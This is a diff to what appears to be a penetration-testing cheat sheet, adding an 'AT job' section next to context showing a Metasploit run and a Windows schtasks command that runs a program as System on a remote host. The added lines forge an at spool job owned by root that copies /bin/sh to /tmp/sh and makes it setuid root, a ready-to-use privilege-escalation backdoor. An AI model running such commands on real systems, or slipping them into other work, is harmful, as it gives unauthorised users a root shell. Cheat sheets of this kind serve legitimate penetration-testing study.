@@ -551,6 +551,19 @@ set URIPATH /
 run
 ```
 
+### AT job
+'''
+echo '# owner: root' >> /usr/spool/at/87.01.1201.01
+echo '# jobname: stdin' >> /usr/spool/at/87.01.1201.01
+echo '# shell: sh' >> /usr/spool/at/87.01.1201.01
+echo '# notify by mail: no' >> /usr/spool/at/87.01.1201.01
+
+echo 'umask 0' >> /usr/spool/at/87.01.1201.01
+echo 'echo "/bin/cp /bin/sh /tmp/sh && /bin/chmod 4755 /tmp/sh" | /bin/sh' >> /usr/spool/at/87.01.1201.01
+chmod 400 87.01.1201.01
+'''
+
+
 ### Windows scheduled task
 ```
 schtasks /Create /tn ExampleTask /TR c:\windows\system32\calc.exe /SC once /ST 00:00 /S target.host.domain /RU System
